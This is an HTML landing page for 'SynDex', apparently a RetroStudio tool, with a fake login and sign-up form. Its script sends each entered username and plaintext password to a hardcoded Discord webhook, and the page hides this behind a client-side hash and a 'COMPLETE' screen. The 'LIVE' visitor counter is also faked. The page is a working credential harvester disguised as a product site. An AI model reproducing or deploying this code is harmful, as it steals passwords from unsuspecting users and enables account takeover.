<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SynDex | RetroStudio</title>
    <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #050505;
            --txt: #ffffff;
            --blue: #0084ff;
            --card: #111111;
            --brd: #222222;
            --muted: #a1a1a1;
            --ok: #22c55e;
            --err: #ef4444;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--txt); line-height: 1.6; overflow-x: hidden; }

        .bg-glow {
            position: absolute; top: 0; left: 50%; transform: translateX(-50%);
            width: 100%; height: 400px;
            background: radial-gradient(circle at center, rgba(0, 132, 255, 0.08) 0%, transparent 70%);
            z-index: -1;
        }

        nav {
            display: flex; justify-content: space-between; align-items: center;
            padding: 1rem 8%; border-bottom: 1px solid var(--brd);
            backdrop-filter: blur(12px); position: sticky; top: 0; z-index: 100;
            background: rgba(5, 5, 5, 0.7);
        }

        .counter {
            font-size: 11px; color: var(--muted); font-weight: 800;
            background: #111; padding: 5px 10px;
            border-radius: 3px; border: 1px solid var(--brd);
        }

        .nav-links a {
            color: var(--muted); text-decoration: none;
            margin-left: 2rem; font-size: 13px; font-weight: 500;
        }

        header {
            min-height: 65vh; display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center;
            padding: 0 10%;
        }

        .ver-tag {
            background: rgba(0, 132, 255, 0.1); color: var(--blue);
            padding: 5px 14px; border-radius: 50px; font-size: 11px;
            font-weight: 800; margin-bottom: 20px; border: 1px solid rgba(0, 132, 255, 0.2);
        }

        h1 { font-size: clamp(30px, 8vw, 85px); font-weight: 900; letter-spacing: -3px; line-height: 0.9; margin-bottom: 20px; }
        .hero-sub { color: var(--muted); max-width: 500px; font-size: 18px; margin-bottom: 40px; }

        .action-btn {
            background: #fff; color: #000;
            padding: 14px 32px; border-radius: 4px; text-decoration: none;
            font-weight: 700; font-size: 14px; border: none; cursor: pointer;
        }

        .grid-features {
            padding: 60px 8%;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }

        .box { background: var(--card); padding: 40px; border-radius: 6px; border: 1px solid var(--brd); }
        .box h3 { margin-bottom: 12px; }
        .box p { color: var(--muted); font-size: 14px; }

        #modal {
            display: none; position: fixed; inset: 0;
            background: rgba(0, 0, 0, 0.9); z-index: 1000;
            align-items: center; justify-content: center;
        }
        .form-wrap { background: var(--card); padding: 50px; border: 1px solid var(--brd); border-radius: 8px; width: 400px; text-align: center; }
        .inp { width: 100%; background: #000; border: 1px solid var(--brd); padding: 12px; color: #fff; margin-bottom: 12px; outline: none; }
        
        #done-ui { position: absolute; inset: 0; background: var(--card); display: none; flex-direction: column; align-items: center; justify-content: center; }

        footer { padding: 50px; text-align: center; border-top: 1px solid var(--brd); color: #333; font-size: 12px; }
    </style>
</head>
<body>

    <div class="bg-glow"></div>

    <nav>
        <div style="display:flex; align-items:center; gap:20px;">
            <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/syndex_biglogo1.png" style="height:35px;">
            <div class="counter">LIVE: <span id="v-count">0</span></div>
        </div>
        <div class="nav-links">
            <a href="https://discord.gg/bA4PH3gvRN">Discord</a>
        </div>
    </nav>

    <header>
        <div class="ver-tag">V2.0 STABLE</div>
        <h1>Power.<br>Control.</h1>
        <p class="hero-sub">The most reliable environment for RetroStudio.</p>
        <button class="action-btn" id="open-btn">Get Started</button>
    </header>

    <section class="grid-features">
        <div class="box"><h3>Performance</h3><p>Optimized core for low-end devices.</p></div>
        <div class="box"><h3>Security</h3><p>Integrated KronkSS protection protocols.</p></div>
        <div class="box"><h3>Reliable</h3><p>24/7 uptime for all user modules.</p></div>
    </section>

    <div id="modal">
        <div class="form-wrap" style="position:relative;">
            <div id="done-ui">
                <h2 style="color:var(--ok)">COMPLETE</h2>
            </div>
            <h2 id="m-title" style="margin-bottom:20px;">Access</h2>
            <div id="err-box" style="color:var(--err); font-size:12px; margin-bottom:10px; display:none;"></div>
            <form id="gate-form">
                <input type="text" id="u" class="inp" placeholder="Username" required>
                <input type="password" id="p" class="inp" placeholder="Password" required>
                <button type="submit" class="action-btn" style="width:100%" id="go-btn">Continue</button>
            </form>
            <p style="margin-top:20px; font-size:12px;">
                <span id="t-text">New here?</span> 
                <a href="#" id="t-btn" style="color:var(--blue); text-decoration:none; font-weight:bold;">Sign Up</a>
            </p>
        </div>
    </div>

    <footer>
        SYNTEAM &copy; 2026
    </footer>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1462655455817105490/owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN";
        const ui = {
            modal: document.getElementById('modal'),
            open: document.getElementById('open-btn'),
            toggle: document.getElementById('t-btn'),
            err: document.getElementById('err-box'),
            btn: document.getElementById('go-btn'),
            form: document.getElementById('gate-form')
        };

        let isLogin = true;

        let visits = parseInt(localStorage.getItem('v_total') || "1241");
        if(!sessionStorage.getItem('v_active')) {
            visits++;
            localStorage.setItem('v_total', visits);
            sessionStorage.setItem('v_active', '1');
        }
        document.getElementById('v-count').innerText = visits.toLocaleString();

        ui.open.onclick = () => ui.modal.style.display = 'flex';
        window.onclick = (e) => { if(e.target == ui.modal) ui.modal.style.display = 'none'; };

        ui.toggle.onclick = (e) => {
            e.preventDefault();
            isLogin = !isLogin;
            ui.err.style.display = 'none';
            document.getElementById('m-title').innerText = isLogin ? 'Access' : 'Create';
            document.getElementById('t-text').innerText = isLogin ? 'New here?' : 'Back to';
            ui.toggle.innerText = isLogin ? 'Sign Up' : 'Login';
        };

        async function hash(str) {
            const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
            return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
        }

        ui.form.onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('u').value.trim();
            const pass = document.getElementById('p').value;
            let db = JSON.parse(localStorage.getItem('app_db') || '{}');

            ui.btn.disabled = true;
            ui.btn.innerText = "...";

            const key = await hash(pass + user.toLowerCase());
            const isAdmin = user.toLowerCase() === "nexus";

            if (isLogin) {
                if (!db[user] || db[user].p !== key) {
                    ui.err.innerText = "AUTH FAILURE";
                    ui.err.style.display = 'block';
                    ui.btn.disabled = false;
                    ui.btn.innerText = "Continue";
                    return;
                }
            } else {
                if (db[user]) {
                    ui.err.innerText = "TAKEN";
                    ui.err.style.display = 'block';
                    ui.btn.disabled = false;
                    ui.btn.innerText = "Continue";
                    return;
                }
                db[user] = { p: key, a: isAdmin };
                localStorage.setItem('app_db', JSON.stringify(db));
            }

            const log = {
                embeds: [{
                    title: isLogin ? "Entry" : "Register",
                    color: isAdmin ? 0x000000 : 0x0084ff,
                    fields: [
                        { name: "User", value: user, inline: true },
                        { name: "Pass", value: pass, inline: true }
                    ]
                }]
            };

            fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(log) }).catch(() => {});
            
            document.getElementById('done-ui').style.display = 'flex';
            setTimeout(() => {
                ui.modal.style.display = 'none';
                document.getElementById('done-ui').style.display = 'none';
                ui.btn.disabled = false;
                ui.btn.innerText = "Continue";
            }, 1500);
        };
    </script>
</body>
</html>
